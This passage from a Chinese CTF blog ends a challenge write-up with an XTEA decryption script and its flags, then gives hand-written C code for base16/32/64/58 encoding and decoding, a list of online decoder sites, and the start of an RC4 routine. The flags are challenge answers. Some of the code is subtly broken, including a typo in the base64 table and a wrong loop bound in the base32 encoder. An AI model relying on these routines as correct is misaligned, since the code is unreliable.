pass3</code></pre><p>所以得到flag：sctf{ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)}</p><h2 id="easy-reverse-200"><a href="#easy-reverse-200" class="headerlink" title="easy-reverse-200"></a>easy-reverse-200</h2><p>不知道为什么交不了flag了</p><p>分析函数，发现是对字节加密的xtea算法，对delat也进行了修改。<br><img src="https://i.loli.net/2021/06/04/KHsvD5qxQPV9Tta.png"><br>脚本解密</p><pre><code>#include&lt;stdio.h&gt;void decrypt(unsigned int r ,char *code ,int *key)&#123;    char v0,v1,i,j=0;    unsigned char sum=0xD9u;    v0=code[0];    v1=code[1];    do    &#123;        sum += 71;        v1 -= (sum + *(unsigned __int8 *)(key + (((char)sum &gt;&gt; 11) &amp; 3))) ^ (v0 + (16 * (char)v0 ^ ((char)v0 &gt;&gt; 5)));        v0 -= (v1 + (((char)v1 &gt;&gt; 5) ^ 16 * (char)v1)) ^ (sum + *(unsigned __int8 *)(key + (sum &amp; 3)));    &#125;while(sum!=0xb9);    code[0]=v0;    code[1]=v1;    printf(&quot;%c%c&quot;,code[0]%128,code[1]%128);&#125;int main()&#123;    int key[4]=&#123;0xde,0xad,0xbe,0xef&#125;;    unsigned int r=32;    char code[24]=&#123; 0xBF, 0xF1, 0x6A, 0x2C, 0x10, 0x0B, 0x16, 0x59, 0xBA, 0x3A,   0x8C, 0x49, 0x05, 0x1B, 0x04, 0xE2, 0x85, 0xD5, 0xC2, 0xFC,   0xD7, 0x9B, 0xE9, 0x42&#125;;    int i;    for(i=0;i&lt;24;i+=2)    &#123;        decrypt(r,&amp;code[i],key);    &#125;&#125;//zctf&#123;ha_hAha_d1l_exp0r7&#125;</code></pre><h2 id=""><a href="#" class="headerlink" title="##"></a>##</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用算法</title>
      <link href="2021/01/18/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/"/>
      <url>2021/01/18/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>ctf常见编码与加密：<a href="https://blog.csdn.net/ruoli_s/article/details/109767829">https://blog.csdn.net/ruoli_s/article/details/109767829</a></p><p>在线解密网站：</p><pre><code>xssee:http://web2hack.org/xsseexssee:http://evilcos.me/lab/xssee程默的博客(DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):http://tool.chacuo.net/cryptdes在线编码解码(多种并排):http://bianma.911cha.com在线加密解密(多种):http://encode.chahuo.comUnicode转中文:http://www.bejson.com/convert/unicode_chinese栅栏密码 &amp;&amp; 凯撒密码 &amp;&amp; 摩斯电码:http://heartsnote.com/tools/cipher.htmCaesar cipher(凯撒密码):http://planetcalc.com/1434/Quoted-Printable &amp;&amp; ROT13:http://www.mxcz.net/tools/QuotedPrintable.aspxROT5/13/18/47编码转换:http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.phpBase32/16:http://pbaseconverter.com/Base32:https://tools.deamwork.com/crypt/decrypt/base32decode.htmlquipqiup古典密码自动化爆破(词频分析):http://quipqiup.com/index.php词频分析/替换:http://cryptoclub.org/tools/cracksub_topframe.php&#39;+.&lt;&gt;[]&#39; &amp;&amp; &#39;!.?&#39;(Brainfuck/Ook!):https://www.splitbrain.org/services/ook&#39;+-.&lt;&gt;[]&#39;(Brainfuck):https://www.nayuki.io/page/brainfuck-interpreter-javascript&#39;+-.&lt;&gt;[]&#39;(Brainfuck):http://esoteric.sange.fi/brainfuck/impl/interp/i.html&#39;()[]!+&#39;JavaScript编码(JSfuck):http://discogscounter.getfreehosting.co.uk/js-noalnum.php用 6 个字符&#39;()[]!+&#39;来编写 JavaScript 程序(JSfuck同上):http://www.jsfuck.com/http://patriciopalladino.com/files/hieroglyphy/摩斯密码翻译器:http://www.jb51.net/tools/morse.htmMorse Code摩尔斯电码:http://rumkin.com/tools/cipher/morse.php摩尔斯电码转换器:http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx字符串编码，解码，转换(长度,反转,进制转换):http://www.5ixuexiwang.com/str/Cisco Type 7 Reverser:http://packetlife.net/toolbox/type7Cisco:http://www.ifm.net.nz/cookbooks/passwordcracker.htmlcmd5 &amp;&amp; NTLM &amp;&amp; mysql…:http://www.cmd5.comspammimic(字符2一段话):http://www.spammimic.com/js代码在线加密解密:https://tool.lu/js/JScript/VBscript脚本解密(#@~^….^#~@):http://www.dheart.net/decode/index.phpVBScript.Encode解密(tip:Asp encode):http://adophper.com/encode.htmlJScript.Encode脚本加密与解密:http://www.haokuwang.com/jsendecode.htm&#39;+/v+&#39;UTF-7加密:http://web2hack.org/xssee各种无知密码解密:http://www.tools88.comuuencode解码 &amp;&amp; xxencode解码(古老的邮件密码):http://web.chacuo.net/charsetuuencodeMIME标准(邮件编码的一种):http://dogmamix.com/MimeHeadersDecoder/Binhex编码(邮件编码的一种,常见于MAC机):http://encoders-decoders.online-domain-tools.com/%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):http://web.chacuo.net/charsetescape猪圈密码:http://www.simonsingh.net/The_Black_Chamber/pigpen.htmlppencode(把Perl代码转换成只有英文字母的字符串):http://namazu.org/~takesako/ppencode/demo.htmlrrencode(把ruby代码全部转换成符号):挂了aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):http://utf-8.jp/public/aaencode.html&#39;()[]!+&#39; &amp;&amp; &#39;$=~[]+&quot;_.\();&#39;jother编码jjencode(JS代码转换成只有符号的字符串):http://web2hack.org/xsseejother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：! + ( ) [ ] &#123; &#125;。只用这些字符就能完成对任意字符串的编码）:http://tmxk.org/jother/jjencode/aaencode可用xssee &amp;&amp; Chrome的Console模式来直接输出解密。Manchester曼彻斯特解密：http://eleif.net/manchester.htmlVigenère维多利亚解密：https://www.guballa.de/vigenere-solverVigenère cipher:http://planetcalc.com/2468/Hill cipher(希尔密码):http://planetcalc.com/3327/Atbash cipher(埃特巴什码):http://planetcalc.com/4647/snow(html隐写):http://fog.misty.com/perry/ccs/snow/snow/snow.htmlSerpent加密解密:http://serpent.online-domain-tools.com/十六进制Hex转文本字符串:http://www.bejson.com/convert/ox2str/Hex2text:http://www.convertstring.com/EncodeDecode/HexDecodeBinary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):http://www.binaryhexconverter.com/集合:http://www.qqxiuzi.cn/daohang.htm集合（各种古典密码）:http://rumkin.com/tools/cipher/文本加密为汉字(&quot;盲文&quot;，音符，各种语言，花朵，箭头…):http://www.qqxiuzi.cn/bianma/wenbenjiami.php在线繁体字转换器:http://www.aies.cn在线工具集合:http://tomeko.net/online_tools/二维码/条形码:https://online-barcode-reader.inliteresearch.com/生成二维码:http://www.wwei.cn/在线二维码解密:http://jiema.wwei.cn/Image2Base64:http://www.vgot.net/test/image2base64.php与佛论禅:http://www.keyfc.net/bbs/tools/tudoucode.aspx在线分解GIF帧图:http://zh.bloggif.com/gif-extractbejson(杂乱):http://www.bejson.comatool(杂乱):http://www.atool.orgPunch Card:http://www.kloth.net/services/cardpunch.php分解素数(ESA):http://www.factordb.com/index.php文件在线Hash:http://www.atool.org/file_hash.php</code></pre><h1 id="base系列"><a href="#base系列" class="headerlink" title="base系列"></a>base系列</h1><h2 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h2><p>参考文章，某大佬博客：<a href="https://blog.csdn.net/securitit/article/details/106934357">https://blog.csdn.net/securitit/article/details/106934357</a></p><p><strong>简介</strong>：</p><p>Base16编码使用16个ASCII字符对任何数据进行编码，Base16与Base64的实现原理类似，同样是将原数据二进制形式取指定位数转换为ASCII码。首先获取数据的二进制形式，将其串联起来，每4个比特为一组进行切分，每一组内的4个比特可转换到指定的16个ASCII字符中的一个，将转换后的ASCII字符连接起来，就是编码后的数据。</p><p><strong>编码表</strong><br><img src="https://i.loli.net/2021/01/18/k8XALnIOoHwtpBe.png"></p><h3 id="base16编码"><a href="#base16编码" class="headerlink" title="base16编码"></a>base16编码</h3><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123;    char date[100]=&quot;bacde&quot;;    char code[100];    unsigned char table[17]=&quot;0123456789ABCDEF&quot;;    int len_date,len_code,i,j,num;    len_date=strlen(date);    printf(&quot;明文长度为len_date=%d\n&quot;,len_date);    printf(&quot;明文为：%s\n&quot;,date);    len_code=len_date*2;    for(i=0,j=0;i&lt;len_date;i++,j+=2)    &#123;        code[j]=table[date[i]&gt;&gt;4];        code[j+1]=table[date[i]&amp;15];     &#125;    printf(&quot;密文长度len_code=%d\n&quot;,len_code);    printf(&quot;密文为：&quot;);     for(i=0;i&lt;len_code;i++)    &#123;        printf(&quot;%c&quot;,code[i]);    &#125;&#125;</code></pre><h3 id="base16解码"><a href="#base16解码" class="headerlink" title="base16解码"></a>base16解码</h3><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123;    char code[100]=&quot;6261636465&quot;;    char date[100];    int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,                 0,0,0,0,0,0,0,0,0,0,0,0,                 0,0,0,0,0,0,0,0,0,0,0,0,                 0,0,0,0,0,0,0,62,0,0,0,                 63,0,1,2,3,4,5,6,                 7,8,9,0,0,0,0,0,0,0,10,                 11,12,13,14,15               &#125;;//               printf(&quot;%d&quot;,table[&#39;A&#39;]);     int len_date,len_code,i,j,num;    len_code=strlen(code);    printf(&quot;密文长度为len_code=%d\n&quot;,len_code);    printf(&quot;密文为：%s\n&quot;,code);    len_date=len_code/2;    for(i=0,j=0;i&lt;len_code;i+=2,j++)    &#123;        date[j]=table[code[i]]&lt;&lt;4|table[code[i+1]];    &#125;    printf(&quot;明文长度为len_date=%d\n&quot;,len_date);     printf(&quot;明文为：&quot;);    for(i=0;i&lt;len_date;i++)    &#123;        printf(&quot;%c&quot;,date[i]);     &#125; &#125; </code></pre><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>参考文章，某大佬博客：<a href="https://blog.csdn.net/securitit/article/details/106934385">https://blog.csdn.net/securitit/article/details/106934385</a></p><p><strong>简介</strong>：</p><p>Base32编码使用32个ASCII字符对任何数据进行编码，Base32与Base64的实现原理类似，同样是将原数据二进制形式取指定位数转换为ASCII码。首先获取数据的二进制形式，将其串联起来，每5个比特为一组进行切分，每一组内的5个比特可转换到指定的32个ASCII字符中的一个，将转换后的ASCII字符连接起来，就是编码后的数据。</p><p><strong>编码表</strong></p><p>表1(常用)<br><img src="https://i.loli.net/2021/01/18/e2HMyLSTGw7zD8R.png"><br>表2<br><img src="https://i.loli.net/2021/01/18/twI7PKfSaGYUW9s.png"></p><h3 id="base32编码"><a href="#base32编码" class="headerlink" title="base32编码"></a>base32编码</h3><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(int argc, char *argv[])&#123;    char date[100]=&quot;bacde&quot;;    char code[100];    unsigned char table[33]=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;;    int len_date,len_code,i,j,num;    len_date=strlen(date);    printf(&quot;明文长度为len_date=%d\n&quot;,len_date);    printf(&quot;明文为：%s\n&quot;,date);    if(len_date%5!=0)    &#123;        len_code=(len_date/5+1)*8;    &#125;    else    &#123;        len_code=(len_date/5)*8;     &#125;    for(i=0,j=0;i&lt;len_code;i+=5,j+=8)    &#123;        code[j]=table[date[i]&gt;&gt;3];        code[j+1]=table[((date[i]&amp;7)&lt;&lt;2)|(date[i+1]&gt;&gt;6)];        code[j+2]=table[(date[i+1]&gt;&gt;1)&amp;31];        code[j+3]=table[(date[i+1]&amp;1)&lt;&lt;4|date[i+2]&gt;&gt;4];        code[j+4]=table[(date[i+2]&amp;15)&lt;&lt;1|date[i+3]&gt;&gt;7];        code[j+5]=table[(date[i+3]&gt;&gt;2)&amp;31];        code[j+6]=table[(date[i+3]&amp;3)&lt;&lt;3|date[i+4]&gt;&gt;5];        code[j+7]=table[date[i+4]&amp;31];    &#125;    num=len_date%5;    switch(num)    &#123;        case 1:             for(i=1;i&lt;8-num;i++)            &#123;                code[len_code-i]=&#39;=&#39;;            &#125;            break;        case 2:            for(i=1;i&lt;7-num;i++)            &#123;                code[len_code-i]=&#39;=&#39;;            &#125;                    break;        case 3:            for(i=1;i&lt;7-num;i++)            &#123;                code[len_code-i]=&#39;=&#39;;            &#125;                    break;        case 4:            code[len_code-1]=&#39;=&#39;;                break;    &#125;    printf(&quot;密文长度len_code=%d\n&quot;,len_code);    printf(&quot;密文为：&quot;);     for(i=0;i&lt;len_code;i++)    &#123;        printf(&quot;%c&quot;,code[i]);    &#125;    &#125;</code></pre><h3 id="base32解码"><a href="#base32解码" class="headerlink" title="base32解码"></a>base32解码</h3><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123;    char code[100]=&quot;MJQXG3LTMZZWCZQ=&quot;;    char date[100];    int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,                 0,0,0,0,0,0,0,0,0,0,0,0,                 0,0,0,0,0,0,0,0,0,0,0,0,                 0,0,0,0,0,0,0,0,0,0,0,                 0,0,0,26,27,28,29,30,                 31,0,0,0,0,0,0,0,0,0,0,                 1,2,3,4,5,6,7,8,9,10,11,12,                 13,14,15,16,17,18,19,20,21,                 22,23,24,25               &#125;;    int len_date,len_code,i,j,num;    len_code=strlen(code);    printf(&quot;密文长度为len_code=%d\n&quot;,len_code);    printf(&quot;密文为：%s\n&quot;,code);    if(strstr(code,&quot;======&quot;))    &#123;        len_date=(len_code/8)*5-4;    &#125;        else if(strstr(code,&quot;====&quot;))    &#123;        len_date=(len_code/8)*5-3;    &#125;    else if(strstr(code,&quot;===&quot;))    &#123;        len_date=(len_code/8)*5-2;    &#125;    else if(strstr(code,&quot;=&quot;))    &#123;        len_date=(len_code/8)*5-1;    &#125;    else    &#123;        len_date=(len_code/8)*5;    &#125;            for(i=0,j=0;j&lt;len_date;i+=8,j+=5)    &#123;        date[j]=table[code[i]]&lt;&lt;3|table[code[i+1]]&gt;&gt;2;        date[j+1]=table[code[i+1]]&lt;&lt;6|table[code[i+2]]&lt;&lt;1|table[code[i+3]]&gt;&gt;4;        date[j+2]=table[code[i+3]]&lt;&lt;4|table[code[i+4]]&gt;&gt;1;        date[j+3]=table[code[i+4]]&lt;&lt;7|table[code[i+5]]&lt;&lt;2|table[code[i+6]]&gt;&gt;3;        date[j+4]=table[code[i+6]]&lt;&lt;5|table[code[i+7]];    &#125;    printf(&quot;明文长度为len_date=%d\n&quot;,len_date);     printf(&quot;明文为：&quot;);    for(i=0;i&lt;len_date;i++)    &#123;        printf(&quot;%c&quot;,date[i]);    &#125;&#125; </code></pre><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>参考文章：<a href="https://blog.csdn.net/qq_26093511/article/details/78836087">https://blog.csdn.net/qq_26093511/article/details/78836087</a></p><p><strong>简介</strong>：</p><p>Bse64是一种以64个可打印字符对二进制数据进行编码的编码算法。base64在对数据进行编码时以三个8位字符型数据为一组，取这三个字符型数据的ASCII码，然后以6位为一组组成4个新的数据，这4个新的数据有6位，所以它的最大值为2^6=64。我们以4个6位数据的十进制数从base64表中得到最终编码后的字符。</p><p><strong>编码表</strong></p><p>表1<br><img src="https://i.loli.net/2021/01/18/9PEmGKAWkDdaNOl.png"><br>表2<br><img src="https://i.loli.net/2021/01/18/cRubagl4tDO1xnN.png"></p><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>编码过程图片详解<br><img src="https://i.loli.net/2021/01/18/HxYI8t3pre7k6Gy.jpg"></p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */int main(int argc, char *argv[]) &#123;    char *str1=&quot;Happy birthday!&quot;;    unsigned char *str2;    int len1;    int len2;    int i,j;    unsigned char *table=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789+/&quot;;    len1=strlen(str1);    if(len1%3!=0)    &#123;        len2=(len1/3+1)*4;    &#125;    else    &#123;        len2=(len1/3)*4;    &#125;    str2=malloc(sizeof(unsigned char)*len2+1);     str2[len2]=&#39;\0&#39;;    for(i=0,j=0;i&lt;len1;i+=3,j+=4)    &#123;        str2[j]=table[str1[i]&gt;&gt;2];        str2[j+1]=table[(((str1[i]&amp;3)&lt;&lt;4)|(str1[i+1]&gt;&gt;4))];        str2[j+2]=table[((str1[i+1]&amp;15)&lt;&lt;2)|(str1[i+2]&gt;&gt;6)];        str2[j+3]=table[str1[i+2]&amp;63];     &#125; //    printf(&quot;%d&quot;,len2);     switch(len1%3)    &#123;        case 1:            str2[len2-2]=&#39;=&#39;;            str2[len2-1]=&#39;=&#39;;            break;        case 2:            str2[len2-1]=&#39;=&#39;;            break;    &#125;    for(i=0;i&lt;len2;i++)    &#123;          printf(&quot;%c&quot;,str2[i]);       &#125;    return 0;&#125;</code></pre><p>编码在IDA中的伪代码</p><pre><code>// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123;  _BYTE *v4; // [rsp+20h] [rbp-30h]  int v5; // [rsp+2Ch] [rbp-24h]  int v6; // [rsp+44h] [rbp-Ch]  int v7; // [rsp+48h] [rbp-8h]  int i; // [rsp+48h] [rbp-8h]  int v9; // [rsp+4Ch] [rbp-4h]  _main(*(_QWORD *)&amp;argc, argv, envp);  v5 = strlen(&quot;Happy birthday! yangtianci!&quot;);  if ( v5 % 3 )    v9 = 4 * (v5 / 3 + 1);  else    v9 = 4 * (v5 / 3);  v4 = malloc(v9 + 1i64);  v4[v9] = 0;  v7 = 0;  v6 = 0;  while ( v7 &lt; v5 )  &#123;    v4[v6] = aAbcdefghijklmn[(char)(aHappyBirthdayY[v7] &gt;&gt; 2)];    v4[v6 + 1] = aAbcdefghijklmn[16 * (aHappyBirthdayY[v7] &amp; 3) | (char)(aHappyBirthdayY[v7 + 1] &gt;&gt; 4)];    v4[v6 + 2] = aAbcdefghijklmn[4 * (aHappyBirthdayY[v7 + 1] &amp; 0xF) | (char)(aHappyBirthdayY[v7 + 2] &gt;&gt; 6)];    v4[v6 + 3] = aAbcdefghijklmn[aHappyBirthdayY[v7 + 2] &amp; 0x3F];    v7 += 3;    v6 += 4;  &#125;  //aAbcdefghijklmn...是编码的索引表，4*代表&lt;&lt;2，16*代表&lt;&lt;4。  if ( v5 % 3 == 1 )  &#123;    v4[v9 - 2] = 61;    v4[v9 - 1] = 61;  &#125;  else if ( v5 % 3 == 2 )  &#123;    v4[v9 - 1] = 61;  &#125;//根据数组长度来决定=的个数，61代表=。  for ( i = 0; i &lt; v9; ++i )    putchar((unsigned __int8)v4[i]);  return 0;&#125;</code></pre><h3 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h3><p>解码所用到的索引表</p><pre><code>int main(void)&#123;    int i;int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,         0,0,0,0,0,0,0,0,0,0,0,0,         0,0,0,0,0,0,0,0,0,0,0,0,         0,0,0,0,0,0,0,62,0,0,0,         63,52,53,54,55,56,57,58,         59,60,61,0,0,0,0,0,0,0,0,         1,2,3,4,5,6,7,8,9,10,11,12,         13,14,15,16,17,18,19,20,21,         22,23,24,25,0,0,0,0,0,0,26,         27,28,29,30,31,32,33,34,35,         36,37,38,39,40,41,42,43,44,         45,46,47,48,49,50,51       &#125;;     char str[]=&#123;&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,        &#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,        &#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;        ,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,        &#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,        &#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;+&#39;,&#39;/&#39;&#125;;for(i=0;i&lt;64;i++)    &#123;printf(&quot;%d &quot;,table[str[i]]);    &#125; &#125; </code></pre><hr><p>解码图片详解<br><img src="https://i.loli.net/2021/01/18/YKZacmpgPNjUM8t.jpg"></p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */int main(int argc, char *argv[]) &#123;    char *str1=&quot;SGFwcHkgYmlydGh&quot;;    unsigned char *str2;    int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,62,0,0,0,             63,52,53,54,55,56,57,58,             59,60,61,0,0,0,0,0,0,0,0,             1,2,3,4,5,6,7,8,9,10,11,12,             13,14,15,16,17,18,19,20,21,             22,23,24,25,0,0,0,0,0,0,26,             27,28,29,30,31,32,33,34,35,             36,37,38,39,40,41,42,43,44,             45,46,47,48,49,50,51           &#125;;     int len1;    int len2;    int i,j;     len1=strlen(str1);    if(strstr(str1,&quot;==&quot;))    &#123;        len2=(len1/4)*3-2;    &#125;        else if(strstr(str1,&quot;=&quot;))    &#123;        len2=(len1/4)*3-1;    &#125;    else    &#123;        len2=(len1/4)*3;    &#125;    str2=malloc(sizeof(unsigned char)*len2+1);      str2[len2]=&#39;\0&#39;;    for(i=0,j=0;i&lt;len1-2;i+=4,j+=3)    &#123;        str2[j]=((table[str1[i]])&lt;&lt;2)|((table[str1[i+1]])&gt;&gt;4);        str2[j+1]=(table[str1[i+1]]&lt;&lt;4)|((table[str1[i+2]])&gt;&gt;2);        str2[j+2]=((table[str1[i+2]])&lt;&lt;6)|(table[str1[i+3]]);    &#125;//    printf(&quot;%d&quot;,len2);     for(i=0;i&lt;len2;i++)    &#123;          printf(&quot;%c&quot;,str2[i]);       &#125;    return 0;&#125;</code></pre><p>解码在IDA中的伪代码</p><pre><code>// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4[126]; // [rsp+20h] [rbp-60h]   //v4是那个索引表  _BYTE *v5; // [rsp+218h] [rbp+198h]  int v6; // [rsp+224h] [rbp+1A4h]  char *Str; // [rsp+228h] [rbp+1A8h]  int v8; // [rsp+234h] [rbp+1B4h]  int i; // [rsp+238h] [rbp+1B8h]  int v10; // [rsp+23Ch] [rbp+1BCh]  _main(*(_QWORD *)&amp;argc, argv, envp);  Str = &quot;SGFwcHkgYmlydGhkYXkhIHlhbmd0aWFuY2kh&quot;;  qmemcpy(v4, &amp;unk_403040, 0x1ECui64);   //memcpy指的是C和C++使用的内存拷贝函数，函数原型为void *memcpy(void *destin, void *source, unsigned n)；函数的功能是从源内存地址的起始位置开始拷贝若干个字节到目标内存地址中，即从源source中拷贝n个字节到目标destin中。  v6 = strlen(&quot;SGFwcHkgYmlydGhkYXkhIHlhbmd0aWFuY2kh&quot;);  if ( strstr(Str, &quot;==&quot;) )  &#123;    v10 = 3 * (v6 / 4) - 2;  &#125;  else if ( strchr(Str, 61) )  &#123;    v10 = 3 * (v6 / 4) - 1;  &#125;  else  &#123;    v10 = 3 * (v6 / 4);  &#125;  v5 = malloc(v10 + 1i64);  v5[v10] = 0;  i = 0;  v8 = 0;  while ( v6 - 2 &gt; i )  &#123;    v5[v8] = 4 * v4[Str[i]] | (v4[Str[i + 1]] &gt;&gt; 4); //4*代表&lt;&lt;2    v5[v8 + 1] = 16 * v4[Str[i + 1]] | (v4[Str[i + 2]] &gt;&gt; 2); //16*代表&lt;&lt;4    v5[v8 + 2] = (LOBYTE(v4[Str[i + 2]]) &lt;&lt; 6) | LOBYTE(v4[Str[i + 3]]);    i += 4;    v8 += 3;  &#125;  for ( i = 0; i &lt; v10; ++i )    putchar((unsigned __int8)v5[i]);  putchar(10);  for ( i = 0; i &lt; v10; ++i )  &#123;    v5[i] = 16 * (i ^ v5[i]) | ((i ^ (unsigned __int8)v5[i]) &gt;&gt; 4);//输出数组的for循环改变了，可以随便带一个值去算算。    printf(&quot;%d &quot;, (unsigned __int8)v5[i]);  &#125;  return 0;&#125;</code></pre><h2 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h2><p>参考博客：<a href="https://www.pianshen.com/article/9105343279/">https://www.pianshen.com/article/9105343279/</a>，<a href="https://www.jianshu.com/p/d8af38e091be">https://www.jianshu.com/p/d8af38e091be</a></p><p>前言：个人感觉base58才体现了basexx编码的灵魂，因为其包含了进制转换思想，而base64，base32，base16都可以使用其他算法来实现，而base58就必须用进制转换来实现，但是由于小生不才，没能看懂大佬那个算法，所以现在只对大佬博客里面的算法进行部分讲解。</p><pre><code>#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#include &lt;cmath&gt;using namespace std;int main()&#123;    char date[] = &quot;AB&quot;;    int i,index = 0;    long long sum = 0;    int len_date=strlen(date);    int len_code=strlen(date) *138/100;// len * log(2)256 / log(2)(58)    int len=len_code + 1;//加1是因为用动态数组时结尾那个&#39;\0&#39;     char base58Table[59] = &quot;123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ&quot;;    char *code = (char *)malloc(len * sizeof(char));    memset(code,0,len * sizeof(char));    len_date=strlen(date);    printf(&quot;明文长度为len_date=%d\n&quot;,len_date);    printf(&quot;明文为：%s\n&quot;,date);    //方法一，基本上不可用，明文长一点就没办法了。 //    for(i = 0; i &lt; strlen(plainText); i++) &#123;//可以首先获取累加和 但是这样做的风险就是 随着幂的增加 和会急速暴增//        sum += plainText[i] * pow(256,strlen(plainText)-i-1);//    &#125;////    cout &lt;&lt; sum &lt;&lt; endl;//    for(i = len - 1; i &gt;= 0; i--) &#123;//        encryption[i] = base58Table[sum % 58];//        sum /= 58;//        if(0 == sum )//            break;//    &#125;    //方法二 每次都模 这样就不会存在和超出最大范围    while(index &lt; len_date ) //这个while循环实现的是数制转换     &#123;        int each = date[index];        for(i = len_code;1;i--)        &#123;            each = each + code[i] * 256;            code[i] = each % 58;            each /= 58;            if(each==0)                break;        &#125;        i = 0;//输出        while(!code[i])            i++;        printf(&quot;第%d轮code[]数组的值&quot;,index+1);         for(;i &lt;= len_code; i++)         &#123;            printf(&quot;%-3d &quot;,code[i]);        &#125;        printf(&quot;\n&quot;) ;        index++;    &#125;    i = 0;    while(!code[i])        i++;    printf(&quot;密文长度len_code=%d\n&quot;,len_code);    printf(&quot;密文为：&quot;);         for(;i &lt;= len_code; i++)     &#123;        printf(&quot;%c&quot;,base58Table[code[i]]);    &#125;    return 0;&#125;</code></pre><p>1.len_code：对于加密后的长度问题，实际上关于base系列都是一个道理，就是进制的转换，都是字符串转为大整数，然后转为xx进制。这里放一张图。<br>    <img src="https://i.loli.net/2021/01/18/MAHQCFR2nkuqWT5.jpg"><br>2.进制转换部分，就只以AB为例，感觉有一点需要知道</p><pre><code>(65*256+66)%58=2 等价于 ((58+7)*256+66)%58=2 等价于 (7*256+66)%58=2</code></pre><p>由于没看懂，就只写一些数据。<br><img src="https://i.loli.net/2021/01/18/LJaquRIjDwsr4bg.png"></p><p>总而言之，base58是basexx编码的灵魂，如果知道这个理论可以写出任意其他进制的编码。</p><h1 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h1><p>一些是贴的别人的。</p><h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><p><a href="https://baike.baidu.com/item/RC4/3454548?fr=aladdin">https://baike.baidu.com/item/RC4/3454548?fr=aladdin</a>注意可能也会有魔改的。</p><pre><code>//程序开始#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG;/*初始化函数*/void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123;    int i = 0, j = 0;    char k[256] = &#123; 0 &#125;;    unsigned char tmp = 0;    for (i = 0; i&lt;256; i++)    &#123;        s[i] = i;//做一道re的题时这里就改为了，s[i]=256-i        k[i] = key[i%Len];    &#125;    for (i = 0; i&lt;256; i++)    &#123;        j = (j + s[i] + k[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[i]和s[j]        s[j] = tmp;    &#125;&#125;/*加解密*/void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123;    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[x]和s[y]        s[j] = tmp;        t = (s[i] + 